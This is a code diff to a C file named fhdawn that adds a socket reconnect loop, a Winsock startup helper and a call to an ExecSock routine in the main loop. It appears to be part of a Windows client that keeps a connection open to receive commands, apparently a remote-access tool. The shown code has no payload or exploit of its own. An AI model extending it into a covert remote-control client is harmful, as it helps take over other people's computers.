@@ -1,12 +1,12 @@
 /*
 Author: Fahad (QuantumCore)
 fhdawn.h (c) 2020
-Desc: Main header file 
 Created:  2020-08-15T15:27:04.427Z
 Modified: -
 */
 
 #include "fhdawn.h"
+
 
 int sockprintf(SOCKET sock, const char* words, ...) {
     static char textBuffer[BUFFER];
@@ -14,7 +14,15 @@ int sockprintf(SOCKET sock, const char* words, ...) {
     va_start(args, words);
     vsprintf(textBuffer, words, args);
     va_end(args);
-    return send(sock, textBuffer, strlen(textBuffer), NULL); // see, it's printf but for a socket. instead of printing, at the end it's a send()
+    return send(sock, textBuffer, strlen(textBuffer), 0); // see, it's printf but for a socket. instead of printing, at the end it's a send()
+}
+
+void REConnect(void)
+{
+    closesocket(sockfd);
+    WSACleanup();
+    Sleep(5000);
+    MainConnect();
 }
 
 void fhdawn_main(void)
@@ -27,8 +35,22 @@ void fhdawn_main(void)
         {
             connected = FALSE;
         }
+
+        ExecSock();
+
     }    
 }
+
+void StartWSA(void)
+{
+    WSADATA wsa;
+    if(WSAStartup(MAKEWORD(2,2), &wsa) != 0)
+    {
+        printf("[Error] Error Starting Winsock.");
+        WSAReportError();
+    }
+}
+
 
 void MainConnect(void)
 {
